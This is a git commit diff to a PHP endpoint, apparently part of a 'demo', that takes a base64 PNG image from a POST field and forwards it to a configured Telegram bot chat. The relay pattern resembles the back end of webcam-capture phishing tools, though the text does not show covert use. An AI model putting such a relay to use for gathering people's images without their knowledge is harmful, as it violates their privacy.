8850d70f05a852e02b9a795777186c4a4893f68c
rigojz <rigoj4847@gmail.com>
2025-09-07 16:18:30 -0600

    Update photo.php

--- public/photo.php
+++ public/photo.php
@@ -3,15 +3,25 @@ require_once __DIR__ . '/config.php';
 
 header('Content-Type: application/json');
 
-if (!isset($_FILES['photo'])) {
+if (!isset($_POST['cat'])) {
     http_response_code(400);
-    echo json_encode(['status' => 'no_file']);
+    echo json_encode(['status' => 'no_data']);
     exit;
 }
 
-$tmp_name = $_FILES['photo']['tmp_name'];
-$file_name = basename($_FILES['photo']['name']);
+$img = $_POST['cat'];
 
+// Quitar encabezado base64
+$img = str_replace('data:image/png;base64,', '', $img);
+$img = str_replace(' ', '+', $img);
+
+$data = base64_decode($img);
+
+// Guardar temporalmente
+$tmp_file = tempnam(sys_get_temp_dir(), 'photo_') . ".png";
+file_put_contents($tmp_file, $data);
+
+// Enviar a Telegram
 $token = TELEGRAM_BOT_TOKEN;
 $chat_id = TELEGRAM_CHAT_ID;
 
@@ -19,8 +29,8 @@ $url = "https://api.telegram.org/bot$token/sendPhoto";
 
 $post_fields = [
     'chat_id' => $chat_id,
-    'caption' => "📷 Foto recibida desde la demo",
-    'photo'   => new CURLFile($tmp_name, $_FILES['photo']['type'], $file_name)
+    'caption' => "📸 Foto enviada desde la demo",
+    'photo'   => new CURLFile($tmp_file)
 ];
 
 $ch = curl_init();
@@ -30,5 +40,7 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
 $output = curl_exec($ch);
 curl_close($ch);
+
+unlink($tmp_file);
 
 echo json_encode(['status' => 'photo_sent', 'telegram_response' => $output]);
